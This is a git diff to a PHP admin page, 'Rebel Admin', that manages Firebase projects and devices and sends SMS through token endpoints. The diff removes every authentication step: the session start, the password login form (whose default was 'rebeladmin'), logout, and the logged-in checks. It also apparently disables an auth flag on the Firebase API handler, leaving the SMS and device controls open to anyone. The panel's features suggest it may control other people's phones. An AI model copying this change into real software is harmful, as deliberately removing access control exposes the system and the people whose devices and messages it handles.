@@ -1,29 +1,10 @@
 <?php
 require_once __DIR__ . '/rebel_bot_lib.php';
 
-rebel_admin_session_start();
-
 if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
-  rebel_firebase_api_handle(true);
+  rebel_firebase_api_handle(false);
 }
 
-$loginError = '';
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rebel_admin_login'])) {
-  $pass = (string)($_POST['password'] ?? '');
-  if (rebel_admin_login($pass)) {
-    header('Location: admin.php');
-    exit;
-  }
-  $loginError = 'Galat password — dubara try karo';
-}
-
-if (isset($_GET['logout'])) {
-  rebel_admin_logout();
-  header('Location: admin.php');
-  exit;
-}
-
-$loggedIn = rebel_admin_logged_in();
 $serverProjects = rebel_firebase_list();
 
 if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
@@ -286,44 +267,6 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 </head>
 <body>
 
-<?php if (!$loggedIn): ?>
-<div class="login-screen">
-  <div class="login-card">
-    <div class="login-hero">
-      <div class="avatar-stage">
-        <div class="avatar-face-ring">
-          <div class="avatar-img-wrap">
-            <img class="avatar-face" src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
-          </div>
-        </div>
-        <div class="avatar-laptop">
-          <div class="laptop-lid">
-            <div class="laptop-screen">
-              <div class="laptop-code">
-                <span class="laptop-line l1"><span class="dim">// admin</span> firebase.sync()</span>
-                <span class="laptop-line l2"><span class="hi">await</span> k.php</span>
-                <span class="laptop-line l3">projects<span class="laptop-cursor"></span></span>
-              </div>
-            </div>
-            <div class="laptop-base"></div>
-          </div>
-          <div class="laptop-glow"></div>
-        </div>
-      </div>
-      <h1>Rebel <em>Admin</em></h1>
-    </div>
-    <p class="login-sub">Firebase yahan add karo — <strong>k.php</strong> panel mein auto sync hoga.</p>
-    <?php if ($loginError !== ''): ?><div class="login-err" style="display:block"><?php echo htmlspecialchars($loginError, ENT_QUOTES, 'UTF-8'); ?></div><?php endif; ?>
-    <form method="post">
-      <input type="hidden" name="rebel_admin_login" value="1"/>
-      <input class="key-input" type="password" name="password" placeholder="Admin password" required autofocus style="text-transform:none;letter-spacing:0"/>
-      <button class="btn-primary" type="submit">Login</button>
-    </form>
-    <p class="login-sub" style="margin-top:14px;margin-bottom:0">Default: <span class="mono">rebeladmin</span></p>
-  </div>
-</div>
-<?php else: ?>
-
 <!-- APP -->
 <div class="app" id="appShell">
   <header class="hdr">
@@ -391,7 +334,6 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
       <span class="proto-tag">👑 ADMIN PANEL</span>
       <div class="menu-list">
         <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
-        <a class="menu-item" href="k.php" style="text-decoration:none;color:inherit">K Panel <span>k.php →</span></a>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
       </div>
@@ -423,11 +365,8 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 </div>
 <div class="toast-wrap" id="toasts"></div>
 
-<?php endif; ?>
-
 <script src="firebase_defaults.js"></script>
 <script>
-<?php if ($loggedIn): ?>
 var SEND_SMS_URL='admin.php?rebel_send_sms=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var FIREBASE_API_URL='admin.php?rebel_firebase_api=1';
@@ -559,7 +498,7 @@ function addFirebaseProject(){
       Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
         processClientsData();
         updateFbUi();
-        toast('Added: '+name+' — k.php sync ON',true);
+        toast('Added: '+name,true);
       });
     });
   }).catch(function(){toast('Network error',false);});
@@ -1162,7 +1101,6 @@ setInterval(function(){
   fetchAllData().catch(function(){});
 },60000);
 window.addEventListener('unhandledrejection',function(){});
-<?php endif; ?>
 </script>
 </body>
 </html>
